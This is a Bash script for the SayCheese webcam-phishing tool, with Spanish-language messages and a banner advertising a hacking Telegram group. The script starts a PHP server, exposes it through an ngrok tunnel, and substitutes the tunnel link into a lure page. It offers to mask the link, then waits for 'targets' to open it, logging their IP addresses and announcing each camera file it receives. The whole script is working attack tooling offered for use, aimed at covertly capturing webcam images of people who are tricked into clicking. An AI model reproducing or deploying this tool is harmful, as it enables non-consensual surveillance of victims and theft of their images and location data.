#!/bin/bash
# SayCheese v1.2
# coded by: github.com/thelinuxchoice/saycheese
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2
carpeta=`pwd` 

option_server=1

banner() {


printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
printf "\e[1;92m              |___/ \e[0m                                 \n"

printf " \e[1;77m v1.2 Mejorado por @AnibalTlgram. Grupo:https://t.me/TheRealHacking\e[0m \n"

printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "Requiere php pero no esta instalado. Instalelo. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Esperando objetivos,\e[0m\e[1;77m Presiona Ctrl + C para salir...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] El objetivo abrio el link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Archivo de camara recibido!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "Requiere unzip pero no esta instalado. Instalelo. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Requiere wget pero no esta instalado. Instalelo. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Descargando Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Eror de descarga... Termux, corre:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Eror de descarga... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando servidor de php...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando servidor de ngrok...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;92m] Usa el segundo link:\e[0m\e[1;77m %s\e[0m\n" 
echo -e "\e[1;92m[\e[1;39m+\e[1;92m]\e[1;92m Deseas enmascarar el link?\e[0;32m"

		read -p $'\e[1;92m[\e[1;39m+\e[1;92m]\e[1;92m Elige una opción si/no:\e[1;39m ' cho
            
       		
		case "$cho" in

		s|S|Si|si|SI)
		lnk=$?
		if [ "$lnk" ==  "0" ];then
		cd $carpeta
		gnome-terminal -e 'bash enmascarar.sh' 2> /dev/null
		killall -2 ngrok 2> /dev/null 
		gnome-terminal -e './ngrok http 3333' 2> /dev/null
		



		fi
		;;

		n|no|No|NO)
		killall -2 ngrok 2> /dev/null 
		cd $carpeta
		gnome-terminal -e './ngrok http 3333' 2> /dev/null
		esac


payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[\e[0m\e[1;77m\e[0m\e\e[0m\e[1;93m Esta version usa automaticamente Ngrok\e[0m\n"
default_option_server="1"
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then



ngrok_server
else
printf "\e[1;93m [!] Opcion invalida!\e[0m\n"
sleep 1
clear
start1
fi

}



banner
dependencies
start1

